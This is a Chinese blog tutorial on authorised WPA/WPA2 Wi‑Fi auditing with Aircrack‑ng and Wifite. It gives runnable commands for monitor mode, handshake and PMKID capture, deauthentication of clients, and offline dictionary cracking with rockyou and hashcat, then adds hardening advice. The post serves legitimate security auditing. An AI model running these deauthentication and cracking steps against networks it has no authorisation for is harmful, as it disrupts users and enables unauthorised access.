
            <div class="postcontent">
                <div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
<p><span>命令覆盖 Aircrack‑ng 手动流程与 Wifite 自动化，但边界严格限定为：只测自有或已获书面授权的 AP<span>，不得用于蹭网、入侵邻居/公司网络、扫描或干扰非授权 AP。文中把“破解”统一表述为“授权范围内的离线弱口令验证”。</span></span></p>
<h2><span>0. 合规前置与流程总览</span></h2>
<h3><span>必须满足的前置条件</span></h3>
<ol start="1">
<li>
<p class="ds-markdown-paragraph">书面授权<span>：明确目标 SSID/BSSID、测试时间窗口、联系人、应急回退方式、是否允许主动去认证/PMKID 采集、数据处理方式。</span></p>
</li>
<li>
<p class="ds-markdown-paragraph">只测自有或授权网络<span>：不扫描、不攻击非授权 AP，不影响周边无关网络。</span></p>
</li>
<li>
<p class="ds-markdown-paragraph">隔离实验环境<span>：优先用自有路由器搭建测试 AP，避免影响生产网络。</span></p>
</li>
<li>
<p class="ds-markdown-paragraph">最小影响原则<span>：优先被动扫描、握手包/PMKID 采集、配置核查；去认证属于主动干扰，必须经授权并控制次数。</span></p>
</li>
<li>
<p class="ds-markdown-paragraph">数据合规<span>：抓到的握手包、PMKID、日志、密码哈希加密保存；测试后按授权删除或归档。</span></p>
</li>
</ol>
<h3><span>流程总览</span></h3>
<p class="ds-markdown-paragraph">授权确认 → 环境准备 → 开启监听 → 被动扫描 → 定向抓包 → 授权内触发重连 → 验证握手/PMKID → 离线弱口令验证 → Wifite 自动化审计 → 取证整理 → 清理恢复 → 加固建议</p>
<hr>
<h2><span>1. 环境准备与网卡检查</span></h2>
<p class="ds-markdown-paragraph"><span>使用 Kali Linux 或 ParrotSec，准备支持 Monitor 模式<span>和数据包注入<span>的无线网卡。</span></span></span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre><span class="token function">sudo <span class="token function">apt update
<span class="token function">sudo <span class="token function">apt <span class="token function">install <span class="token parameter variable">-y aircrack-ng wifite reaver bully hashcat tshark hcxtools</span></span></span></span></span></span></pre>
</div>
<p class="ds-markdown-paragraph"><span>检查网卡是否支持监听模式：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>iw list <span class="token operator">| <span class="token function">grep <span class="token parameter variable">-i monitor
<span class="token function">sudo airmon-ng check</span></span></span></span></pre>
</div>
<p class="ds-markdown-paragraph"><span>确认接口名称：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>iw dev
<span class="token function">ip <span class="token function">link
iwconfig</span></span></pre>
</div>
<p class="ds-markdown-paragraph"><span>记下无线接口名，例如 <code>wlan0</code><span>。虚拟机环境必须将 USB 无线网卡直通给 Kali。</span></span></p>
<p class="ds-markdown-paragraph"><span>解压 Kali 自带字典：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre><span class="token function">sudo <span class="token function">gzip <span class="token parameter variable">-d /usr/share/wordlists/rockyou.txt.gz
<span class="token function">ls <span class="token parameter variable">-lh /usr/share/wordlists/rockyou.txt</span></span></span></span></span></pre>
</div>
<hr>
<h2><span>2. 开启监听模式</span></h2>
<p class="ds-markdown-paragraph"><span>以下命令仅用于授权审计环境。<code>airmon-ng check kill</code><span> 会终止可能干扰监听模式的网络管理进程，生产环境需先确认影响。</span></span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre><span class="token function">sudo airmon-ng check <span class="token function">kill
<span class="token function">sudo airmon-ng start wlan0</span></span></span></pre>
</div>
<p class="ds-markdown-paragraph"><span>验证监听接口：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>iwconfig wlan0mon</pre>
</div>
<p class="ds-markdown-paragraph"><span>确认输出中包含 <code>Mode:Monitor</code><span>。接口名可能因驱动不同而不同，以实际输出为准。</span></span></p>
<hr>
<h2><span>3. 被动扫描授权目标 AP</span></h2>
<p class="ds-markdown-paragraph"><span>先做被动扫描，不发送去认证帧：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre><span class="token function">sudo airodump-ng wlan0mon</span></pre>
</div>
<p class="ds-markdown-paragraph"><span>记录授权目标的以下信息：</span></p>
<div class="ds-scroll-area ds-scroll-area--show-on-focus-within ds-scroll-area--enabled _1210dd7 c03cafe9">
<div class="ds-scroll-area__gutters">&nbsp;</div>
<table>
<thead>
<tr><th><span>参数</span></th><th><span>含义</span></th></tr>
</thead>
<tbody>
<tr>
<td><span>BSSID</span></td>
<td><span>目标 AP 的 MAC 地址</span></td>
</tr>
<tr>
<td><span>CH</span></td>
<td><span>信道号</span></td>
</tr>
<tr>
<td><span>ESSID</span></td>
<td><span>网络名称</span></td>
</tr>
<tr>
<td><span>ENC</span></td>
<td><span>加密类型，如 WPA2</span></td>
</tr>
<tr>
<td><span>STATION</span></td>
<td><span>是否存在已连接客户端</span></td>
</tr>
</tbody>
</table>
</div>
<p class="ds-markdown-paragraph"><span>只记录授权范围内的 SSID/BSSID；不要对非授权 AP 做后续定向操作。</span></p>
<hr>
<h2><span>4. 定向抓包与握手包采集</span></h2>
<p class="ds-markdown-paragraph"><span>使用授权目标的 BSSID 和信道定向抓包：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre><span class="token function">sudo airodump-ng <span class="token parameter variable">-c <span class="token operator">&lt;信道<span class="token operator">&gt; <span class="token parameter variable">--bssid <span class="token operator">&lt;目标BSSID<span class="token operator">&gt; <span class="token parameter variable">-w audit wlan0mon</span></span></span></span></span></span></span></span></pre>
</div>
<p class="ds-markdown-paragraph"><span>示例：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre><span class="token function">sudo airodump-ng <span class="token parameter variable">-c <span class="token number">6 <span class="token parameter variable">--bssid AA:BB:CC:DD:EE:FF <span class="token parameter variable">-w audit wlan0mon</span></span></span></span></span></pre>
</div>
<p class="ds-markdown-paragraph"><span>观察 <code>airodump-ng</code><span> 右上角，出现类似：</span></span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">text</span></div>
</div>
</div>
</div>
<pre>[WPA handshake: AA:BB:CC:DD:EE:FF]</pre>
</div>
<p class="ds-markdown-paragraph"><span>表示已捕获 WPA 四次握手。抓包文件通常为 <code>audit-01.cap</code><span>。</span></span></p>
<h3><span>PMKID 采集优先</span></h3>
<p class="ds-markdown-paragraph"><span>在授权允许时，优先尝试 PMKID 被动采集，减少主动干扰。可用 Wifite：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre><span class="token function">sudo wifite <span class="token parameter variable">--pmkid</span></span></pre>
</div>
<p class="ds-markdown-paragraph"><span>或按授权流程使用其他 PMKID 采集工具。PMKID 采集同样只针对授权 AP。</span></p>
<hr>
<h2><span>5. 授权内触发重连（主动干扰，谨慎使用）</span></h2>
<p class="ds-markdown-paragraph"><span>仅在书面授权明确允许主动测试、且目标为授权 AP 时使用。不要对非授权网络发送去认证帧，不建议使用 <code>--deauth 0</code><span> 持续发送。</span></span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre><span class="token function">sudo aireplay-ng <span class="token parameter variable">--deauth <span class="token number">5 <span class="token parameter variable">-a <span class="token operator">&lt;目标BSSID<span class="token operator">&gt; wlan0mon</span></span></span></span></span></span></pre>
</div>
<p class="ds-markdown-paragraph"><span>若已知授权客户端 MAC，可定向触发，干扰更小：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre><span class="token function">sudo aireplay-ng <span class="token parameter variable">--deauth <span class="token number">5 <span class="token parameter variable">-a <span class="token operator">&lt;目标BSSID<span class="token operator">&gt; <span class="token parameter variable">-c <span class="token operator">&lt;客户端MAC<span class="token operator">&gt; wlan0mon</span></span></span></span></span></span></span></span></span></pre>
</div>
<p class="ds-markdown-paragraph"><span>操作要求：</span></p>
<ul>
<li>
<p class="ds-markdown-paragraph"><span>控制次数，例如 5 次，不持续轰炸。</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>记录操作时间、目标 BSSID、是否发生去认证。</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>发送后回到 <code>airodump-ng</code><span> 终端等待握手提示。</span></span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>生产网络或授权窗口外不得执行。</span></p>
</li>
</ul>
<hr>
<h2><span>6. 验证握手包与离线弱口令验证</span></h2>
<p class="ds-markdown-paragraph"><span>先验证抓包文件是否包含有效握手：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>aircrack-ng audit-01.cap</pre>
</div>
<p class="ds-markdown-paragraph"><span>若显示 <code>WPA (1 handshake)</code><span>，说明握手包有效；若为 <code>0 handshakes</code><span>，需重新采集。</span></span></span></p>
<p class="ds-markdown-paragraph"><span>授权范围内做离线弱口令验证：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>aircrack-ng <span class="token parameter variable">-w /usr/share/wordlists/rockyou.txt <span class="token parameter variable">-b <span class="token operator">&lt;目标BSSID<span class="token operator">&gt; audit-01.cap</span></span></span></span></pre>
</div>
<p class="ds-markdown-paragraph"><span>可选：使用 hashcat 做离线验证。先转换格式：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>hcxpcapngtool <span class="token parameter variable">-o audit.hc22000 audit-01.cap
hashcat <span class="token parameter variable">-m <span class="token number">22000 audit.hc22000 /usr/share/wordlists/rockyou.txt</span></span></span></pre>
</div>
<p class="ds-markdown-paragraph"><span>结果仅用于授权审计报告中的弱口令风险验证，不得用于非授权访问。</span></p>
<hr>
<h2><span>7. Wifite 授权审计自动化</span></h2>
<p class="ds-markdown-paragraph"><span>Wifite 本质是把 Aircrack‑ng、Reaver、Hashcat 等工具自动化封装。它会执行扫描、捕获、可能触发去认证等操作，因此必须在授权窗口内运行。</span></p>
<h3><span>基础启动</span></h3>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre><span class="token function">sudo wifite <span class="token parameter variable">--kill</span></span></pre>
</div>
<p class="ds-markdown-paragraph"><span>指定网卡和字典：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre><span class="token function">sudo wifite <span class="token parameter variable">-i wlan0 <span class="token parameter variable">--dict /usr/share/wordlists/rockyou.txt <span class="token parameter variable">--kill</span></span></span></span></pre>
</div>
<h3><span>只审计 WPA/WPA2</span></h3>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre><span class="token function">sudo wifite <span class="token parameter variable">--wpa <span class="token parameter variable">--dict /usr/share/wordlists/rockyou.txt</span></span></span></pre>
</div>
<h3><span>只捕获握手包，不立即破解</span></h3>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre><span class="token function">sudo wifite <span class="token parameter variable">--wpa --skip-crack</span></span></pre>
</div>
<p class="ds-markdown-paragraph"><span>抓包文件通常保存在当前目录的 <code>hs/</code><span> 文件夹。</span></span></p>
<h3><span>仅做 PMKID 采集</span></h3>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre><span class="token function">sudo wifite <span class="token parameter variable">--pmkid</span></span></pre>
</div>
<h3><span>定向指定 BSSID</span></h3>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre><span class="token function">sudo wifite <span class="token parameter variable">--bssid <span class="token operator">&lt;目标BSSID<span class="token operator">&gt; <span class="token parameter variable">--wpa <span class="token parameter variable">--dict /usr/share/wordlists/rockyou.txt</span></span></span></span></span></span></pre>
</div>
<h3><span>降低主动干扰：不发送去认证帧</span></h3>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre><span class="token function">sudo wifite <span class="token parameter variable">--wpa <span class="token parameter variable">--nodeauths --skip-crack</span></span></span></pre>
</div>
<h3><span>只显示存在客户端的网络</span></h3>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre><span class="token function">sudo wifite --clients-only <span class="token parameter variable">--wpa</span></span></pre>
</div>
<h3><span>对已有握手包重新做弱口令验证</span></h3>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre><span class="token function">sudo wifite <span class="token parameter variable">--crack <span class="token parameter variable">--dict /path/to/wordlist.txt</span></span></span></pre>
</div>
<h3><span>查看已破解记录</span></h3>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>wifite <span class="token parameter variable">--cracked</span></pre>
</div>
<h3><span>验证已有抓包文件</span></h3>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>wifite <span class="token parameter variable">--check hs/xxx.cap</span></pre>
</div>
<h3><span>常用参数表</span></h3>
<div class="ds-scroll-area ds-scroll-area--show-on-focus-within ds-scroll-area--enabled _1210dd7 c03cafe9">
<div class="ds-scroll-area__gutters">&nbsp;</div>
<table>
<thead>
<tr><th><span>参数</span></th><th><span>用途</span></th><th><span>合规注意</span></th></tr>
</thead>
<tbody>
<tr>
<td><code>-i</code></td>
<td><span>指定无线网卡</span></td>
<td><span>多网卡环境使用</span></td>
</tr>
<tr>
<td><code>--wpa</code></td>
<td><span>只审计 WPA/WPA2</span></td>
<td><span>排除 WEP/WPS</span></td>
</tr>
<tr>
<td><code>--dict</code></td>
<td><span>指定字典文件</span></td>
<td><span>仅做授权弱口令验证</span></td>
</tr>
<tr>
<td><code>--skip-crack</code></td>
<td><span>只抓包不破解</span></td>
<td><span>降低影响</span></td>
</tr>
<tr>
<td><code>--pmkid</code></td>
<td><span>采集 PMKID</span></td>
<td><span>被动审计优先</span></td>
</tr>
<tr>
<td><code>--kill</code></td>
<td><span>终止冲突进程</span></td>
<td><span>保证监听模式稳定</span></td>
</tr>
<tr>
<td><code>--bssid</code></td>
<td><span>定向目标 BSSID</span></td>
<td><span>只填授权目标</span></td>
</tr>
<tr>
<td><code>--nodeauths</code></td>
<td><span>不发送去认证帧</span></td>
<td><span>降低主动干扰</span></td>
</tr>
<tr>
<td><code>--clients-only</code></td>
<td><span>只显示有客户端网络</span></td>
<td><span>提高采集效率</span></td>
</tr>
<tr>
<td><code>--crack</code></td>
<td><span>对已有握手包重新验证</span></td>
<td><span>仅在授权范围内</span></td>
</tr>
<tr>
<td><code>--cracked</code></td>
<td><span>查看已破解记录</span></td>
<td><span>取证整理</span></td>
</tr>
<tr>
<td><code>--check</code></td>
<td><span>验证已有抓包文件</span></td>
<td><span>检查握手有效性</span></td>
</tr>
</tbody>
</table>
</div>
<p class="ds-markdown-paragraph">建议组合<span>：先用 <code>sudo wifite --wpa --skip-crack --nodeauths</code><span> 做低干扰采集；需要弱口令验证时，再用 <code>aircrack-ng</code><span> 或 <code>hashcat</code><span> 对 <code>hs/</code><span> 中授权目标的抓包做离线验证。</span></span></span></span></span></p>
<hr>
<h2><span>8. 输出与取证整理</span></h2>
<p class="ds-markdown-paragraph"><span>Wifite 通常将握手包、PMKID 和结果保存在 <code>hs/</code><span> 或当前目录输出文件中：</span></span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre><span class="token function">ls hs/
<span class="token function">cat cracked.txt</span></span></pre>
</div>
<p class="ds-markdown-paragraph"><span>审计记录至少包括：</span></p>
<ul>
<li>
<p class="ds-markdown-paragraph"><span>测试时间与授权窗口；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>目标 SSID/BSSID；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>使用的接口和命令；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>是否发生去认证；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>是否抓到握手包/PMKID；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>是否存在弱口令风险；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>数据处理方式：加密保存、删除或归档。</span></p>
</li>
</ul>
<hr>
<h2><span>9. 清理与恢复网络</span></h2>
<p class="ds-markdown-paragraph"><span>审计结束后停止监听模式并恢复网络管理：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre><span class="token function">sudo airmon-ng stop wlan0mon
<span class="token function">sudo systemctl start NetworkManager</span></span></pre>
</div>
<p class="ds-markdown-paragraph"><span>验证接口恢复管理模式：</span></p>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>iwconfig wlan0</pre>
</div>
<p class="ds-markdown-paragraph"><span>确认 <code>Mode</code><span> 回到 <code>Managed</code><span>，网络管理器正常运行。若 Wifite 退出时已自动恢复，也建议手动确认。</span></span></span></p>
<hr>
<h2><span>10. 常见问题与排错</span></h2>
<div class="ds-scroll-area ds-scroll-area--show-on-focus-within ds-scroll-area--enabled _1210dd7 c03cafe9">
<div class="ds-scroll-area__gutters">&nbsp;</div>
<table>
<thead>
<tr><th><span>现象</span></th><th><span>可能原因</span></th><th><span>处理</span></th></tr>
</thead>
<tbody>
<tr>
<td><code>airmon-ng start</code><span> 后接口未改名</span></td>
<td><span>驱动或命名规则不同</span></td>
<td><span>用 <code>iwconfig</code><span> 查看实际接口名；必要时手动设置 monitor</span></span></td>
</tr>
<tr>
<td><code>airodump-ng</code><span> 看不到网络</span></td>
<td><span>未进入监听模式或接口选错</span></td>
<td><span>确认 <code>Mode:Monitor</code><span>，更换 USB 口/接口</span></span></td>
</tr>
<tr>
<td><span>始终抓不到握手包</span></td>
<td><span>无客户端在线；去认证未生效；信道偏移</span></td>
<td><span>选择有客户端网络；确认 <code>--bssid</code><span> 和 <code>-c</code><span> 一致；控制去认证次数</span></span></span></td>
</tr>
<tr>
<td><span>Wifite 扫描不到网络</span></td>
<td><span>冲突进程未终止；接口被占用</span></td>
<td><span>使用 <code>--kill</code><span>，或先执行 <code>airmon-ng check kill</code></span></span></td>
</tr>
<tr>
<td><span>握手包显示 <code>0 handshakes</code></span></td>
<td><span>抓包未锁定信道或握手不完整</span></td>
<td><span>重新定向抓包并等待握手提示后再停止</span></td>
</tr>
<tr>
<td><span>弱口令验证很慢</span></td>
<td><span>字典过大或仅 CPU</span></td>
<td><span>先用小字典测试；大规模字典考虑 hashcat + GPU</span></td>
</tr>
</tbody>
</table>
</div>
<hr>
<h2><span>11. 加固建议</span></h2>
<ol start="1">
<li>
<p class="ds-markdown-paragraph"><span>禁用弱口令，使用足够长的随机密码。</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>关闭 WPS，或确认路由器已修复 Pixie‑Dust 相关风险。</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>优先使用 WPA3‑SAE；必须用 WPA2 时配合强密码和 802.1X。</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>限制管理接口暴露，开启访客网络隔离。</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>定期更新路由器固件。</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>对重要无线环境做周期性授权无线安全审计。</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>对审计中采集的握手包、PMKID、日志和哈希加密保存，按授权要求删除或归档。</span></p>
</li>
</ol><hr>
<p class="ds-markdown-paragraph">一句话总结<span>：把前文的 Aircrack‑ng 手动流程与 Wifite 自动化流程整合后，正确用法是“授权确认 → 被动优先 → 定向采集 → 授权内最小干扰 → 离线弱口令验证 → 取证 → 清理 → 加固<span>”；不要把它用于非授权 Wi‑Fi 的扫描、去认证或破解。</span></span></p>

</div>
